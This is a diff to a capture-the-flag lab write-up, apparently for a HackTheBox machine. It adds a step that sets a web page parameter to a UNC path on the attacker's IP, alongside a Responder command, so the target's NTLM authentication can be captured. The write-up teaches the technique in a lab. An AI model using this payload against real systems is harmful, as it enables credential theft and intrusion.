@@ -64,6 +64,9 @@ sudo responder -I tun0
 ![Responder started](./writeup-images/responder-initiation.png)
 
 Then configured the parameter to call our malicious SMB path:
+```
+http://unika.htb/?page=//10.10.14.17/somefile
+```
 
 ![Setting page param](./writeup-images/setting-page-parameter.png)
 
